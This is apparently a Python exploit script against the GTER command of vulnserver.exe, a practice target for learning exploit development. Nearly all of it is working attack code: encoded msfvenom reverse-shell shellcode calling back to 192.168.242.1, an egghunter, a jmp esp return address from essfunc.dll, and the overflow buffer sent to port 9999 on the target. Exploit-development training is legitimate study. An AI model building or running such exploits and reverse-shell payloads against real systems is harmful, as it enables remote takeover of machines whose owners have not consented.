#!/usr/bin/python
#
# exploit code for the GTER command from "vulnserver.exe"
# previous version (see "test" repository) didn't work properly
# this one returns a reverse shell as expected.
#

import socket
import os
import sys
import struct

# shellcode
# ./msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c LHOST=192.168.242.1
# 
shellcode = ("\xd9\xeb\xd9\x74\x24\xf4\x5e\x2b\xc9\xb8\x2e\xfe\x8f\x27\xb1"
"\x52\x31\x46\x17\x03\x46\x17\x83\xc0\x02\x6d\xd2\xe0\x13\xf0"
"\x1d\x18\xe4\x95\x94\xfd\xd5\x95\xc3\x76\x45\x26\x87\xda\x6a"
"\xcd\xc5\xce\xf9\xa3\xc1\xe1\x4a\x09\x34\xcc\x4b\x22\x04\x4f"
"\xc8\x39\x59\xaf\xf1\xf1\xac\xae\x36\xef\x5d\xe2\xef\x7b\xf3"
"\x12\x9b\x36\xc8\x99\xd7\xd7\x48\x7e\xaf\xd6\x79\xd1\xbb\x80"
"\x59\xd0\x68\xb9\xd3\xca\x6d\x84\xaa\x61\x45\x72\x2d\xa3\x97"
"\x7b\x82\x8a\x17\x8e\xda\xcb\x90\x71\xa9\x25\xe3\x0c\xaa\xf2"
"\x99\xca\x3f\xe0\x3a\x98\x98\xcc\xbb\x4d\x7e\x87\xb0\x3a\xf4"
"\xcf\xd4\xbd\xd9\x64\xe0\x36\xdc\xaa\x60\x0c\xfb\x6e\x28\xd6"
"\x62\x37\x94\xb9\x9b\x27\x77\x65\x3e\x2c\x9a\x72\x33\x6f\xf3"
"\xb7\x7e\x8f\x03\xd0\x09\xfc\x31\x7f\xa2\x6a\x7a\x08\x6c\x6d"
"\x7d\x23\xc8\xe1\x80\xcc\x29\x28\x47\x98\x79\x42\x6e\xa1\x11"
"\x92\x8f\x74\xb5\xc2\x3f\x27\x76\xb2\xff\x97\x1e\xd8\x0f\xc7"
"\x3f\xe3\xc5\x60\xd5\x1e\x8e\x4e\x82\xd2\x4f\x27\xd1\x12\x41"
"\xeb\x5c\xf4\x0b\x03\x09\xaf\xa3\xba\x10\x3b\x55\x42\x8f\x46"
"\x55\xc8\x3c\xb7\x18\x39\x48\xab\xcd\xc9\x07\x91\x58\xd5\xbd"
"\xbd\x07\x44\x5a\x3d\x41\x75\xf5\x6a\x06\x4b\x0c\xfe\xba\xf2"
"\xa6\x1c\x47\x62\x80\xa4\x9c\x57\x0f\x25\x50\xe3\x2b\x35\xac"
"\xec\x77\x61\x60\xbb\x21\xdf\xc6\x15\x80\x89\x90\xca\x4a\x5d"
"\x64\x21\x4d\x1b\x69\x6c\x3b\xc3\xd8\xd9\x7a\xfc\xd5\x8d\x8a"
"\x85\x0b\x2e\x74\x5c\x88\x5e\x3f\xfc\xb9\xf6\xe6\x95\xfb\x9a"
"\x18\x40\x3f\xa3\x9a\x60\xc0\x50\x82\x01\xc5\x1d\x04\xfa\xb7"
"\x0e\xe1\xfc\x64\x2e\x20")

# egghunter will search for T00WT00W and jump right after it
egghunter = ("\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30"
"\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

# Crash at 151 bytes actually
crash = "\x41" * (147 - len(egghunter) - 10)

# jmp esp address found in essfunc.dll
addr = struct.pack("<I", 0x62501203)

# that's our crash string :
# - GTER command + a few chars (actually, only a '.' is mandatory)
# - a few nops, then our egghunter
# - followed by a few more nops
# - then our EIP overwrite (jmp esp)
# - contents of ESP after crash (jump-back in order to land exactly on the egghunter)
# - and a few nops
buffer = "GTER /.:/" + crash + egghunter + "\x90" * 10 + addr + "\x90" * 10 + "\xeb\xc4"

print "[*] Sending ..."
# iterates through a few commands, maybe one of them will keep my payload...
for c in ["HELP", "GMON", "GDOG", "HTER", "LTER", "KSTAN"]:
	expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	expl.connect(("192.168.242.66", 9999))
	print expl.recv(1024)
	# We send our final shellcode first, as it will reside in a malloc()'ed area
	# Second stage payload here with egg ("T00WT00W")
	egg = c + " " + "T00WT00W" + shellcode
	expl.send(egg)
	print "len: " + str(len(egg))

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.242.66", 9999))
print expl.recv(1024)
# Then we send our crash string with our first stage payload
expl.send(buffer)
expl.close()
